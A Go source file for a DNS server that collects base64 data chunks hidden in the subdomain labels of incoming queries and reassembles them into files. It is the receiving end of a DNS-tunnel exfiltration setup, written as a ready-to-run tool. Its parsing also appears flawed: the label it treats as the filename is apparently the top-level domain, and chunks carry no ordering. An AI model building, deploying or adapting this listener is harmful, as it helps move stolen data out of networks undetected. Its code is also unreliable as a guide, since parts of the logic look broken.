// Go Server: receiver.go
package main

import (
    "encoding/base64"
    "fmt"
    "github.com/miekg/dns"
    "os"
    "strings"
    "sync"
)

var (
    dataStore = make(map[string][]string)
    mutex     = &sync.Mutex{}
)

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := dns.Msg{}
    msg.SetReply(r)

    for _, q := range r.Question {
        if q.Qtype == dns.TypeA {
            domain := strings.ToLower(q.Name)
            parts := strings.Split(domain, ".")
            if len(parts) < 2 {
                continue
            }

            mutex.Lock()
            filename := parts[len(parts)-2] // filename is the part before the root domain
            chunks := parts[:len(parts)-2] // the data chunks are everything before filename
            chunkData := strings.Join(chunks, "")
            //chunkData = strings.ReplaceAll(chunkData, "-", "")
            chunkData = strings.ReplaceAll(chunkData, "-", "") // if you were using '-' as delimiter
						chunkData = strings.ReplaceAll(chunkData, ".", "") // Remove dots accidentally inserted from domain structure

						dataStore[filename] = append(dataStore[filename], chunkData)
            mutex.Unlock()

            fmt.Printf("[+] Received chunk for %s\n", filename)
        }
    }

    w.WriteMsg(&msg)
}

func startServer() {
    dns.HandleFunc(".", handleDNSRequest)
    server := &dns.Server{Addr: ":53", Net: "udp"}
    fmt.Println("[*] DNS server listening on port 53...")
    err := server.ListenAndServe()
    if err != nil {
        fmt.Printf("Failed to start server: %s\n", err.Error())
        os.Exit(1)
    }
}

func saveFiles() {
    mutex.Lock()
    defer mutex.Unlock()
    for filename, chunks := range dataStore {
        fullData := strings.Join(chunks, "")
				// base64 requires padding, add if needed
				missingPadding := len(fullData) % 4
				if missingPadding != 0 {
    			fullData += strings.Repeat("=", 4 - missingPadding)
					}
				decoded, err := base64.StdEncoding.DecodeString(fullData)
        if err != nil {
            fmt.Printf("[-] Failed to decode base64 for %s: %s\n", filename, err)
            continue
        }
        err = os.WriteFile(filename, decoded, 0644)
        if err != nil {
            fmt.Printf("[-] Failed to write file %s: %s\n", filename, err)
        } else {
            fmt.Printf("[+] Reconstructed file: %s\n", filename)
        }
    }
}

func main() {
    go startServer()
    fmt.Println("Press Enter to stop and save files...")
    fmt.Scanln()
    saveFiles()
}

